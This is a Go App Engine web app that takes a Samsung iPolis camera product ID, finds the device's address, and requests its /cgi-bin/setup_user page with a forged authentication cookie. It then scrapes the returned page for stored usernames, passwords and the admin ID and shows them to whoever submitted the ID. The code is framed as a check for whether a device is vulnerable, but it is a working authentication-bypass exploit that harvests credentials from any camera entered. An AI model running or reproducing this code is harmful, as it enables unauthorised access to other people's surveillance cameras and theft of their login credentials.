package hello

import (
//	"bufio"
	"appengine"
	"appengine/urlfetch"
	"bytes"
    "fmt"
	"net"
    "net/http"
	"io/ioutil"
	"text/template"
	"regexp"
	"strings"
)

func init() {
    http.HandleFunc("/", handler)
    http.HandleFunc("/check", check)
}

func handler(w http.ResponseWriter, r *http.Request) {
	t := template.Must(template.ParseFiles("main.html"))
	buf := new(bytes.Buffer)
	t.Execute(buf, nil)
    fmt.Fprint(w, buf)
}

type HTMLResult struct {
	Url string;
	Result string;
}

func check(w http.ResponseWriter, r *http.Request) {
	SAMSUNG_BASE_URL := "http://www.samsungipolis.com"

	product := r.FormValue("productID")

	if product == "" {
		fmt.Fprint(w, "No productID provided")
		return
	} else {
//		fmt.Fprintf(w, "You typed: %s\n", product)

		url := fmt.Sprintf("%s/%s", SAMSUNG_BASE_URL, product)

		c := appengine.NewContext(r)
		client := urlfetch.Client(c)
		resp, err := client.Get(url)

		if err != nil {
			fmt.Fprintf(w, "Could not reach Samsung's IPolis site %s", err)
			return
		}
		body, err := ioutil.ReadAll(resp.Body)
		refresh := checkBody(string(body))

		if len(refresh) > 1 {
			//fmt.Fprintf(w, "Response %s", refresh[1])

			host, port, err := net.SplitHostPort(refresh[1])

			url = fmt.Sprintf("http://%s:%s/cgi-bin/setup_user", host, port)
			req, err := http.NewRequest("GET", url, nil)
			req.Header.Add("Cookie", "DATA1=YWFhYWFhYWFhYQ==")

			resp, err := client.Do(req)

			if err != nil {
				fmt.Fprintf(w, "Error reaching %s\n", refresh[1])
				return
			}

			body, err := ioutil.ReadAll(resp.Body)
			result := isHacked(string(body))

			if result != "" {
				t := template.Must(template.ParseFiles("result.html"))

				html_result := HTMLResult{refresh[1], result}
				err = t.Execute(w, html_result)
				if err != nil { panic(err) }
			}
		}
	}
}

func checkBody(body string) []string {
	re := regexp.MustCompile("<meta http-equiv=\"refresh\" content=\"0;url=http://(.[^\"]*)\"/>")

	return re.FindStringSubmatch(body)
}

func isHacked(response string) string {
	lines := strings.Split(response, "\n")

	result := ""
	regexUsername := regexp.MustCompile(".*<input type='hidden' name='nameUser_Name_[0-9]*' value='(.*)'.*")
	regexPassword := regexp.MustCompile(".*<input type='hidden' name='nameUser_Pw_[0-9]*' value='(.*)'.*")
	regexAdmin := regexp.MustCompile(".*<input type=hidden name='admin_id' value='(.*)'.*")

	for i := 0; i < len(lines); i++ {
		usernameMatches := regexUsername.FindStringSubmatch(lines[i])
		passwordMatches := regexPassword.FindStringSubmatch(lines[i])
		adminMatches := regexAdmin.FindStringSubmatch(lines[i])

		if len(usernameMatches) > 1 {
			result = fmt.Sprintf("%s%s", result, usernameMatches[1]);
		} else if len(passwordMatches) > 1 {
			result = fmt.Sprintf("%s: %s<br>", result, passwordMatches[1])
		} else if len(adminMatches) > 1 {
			result = fmt.Sprintf("%sAdmin ID => %s", result, adminMatches[1])
		}
	}

	return result
}
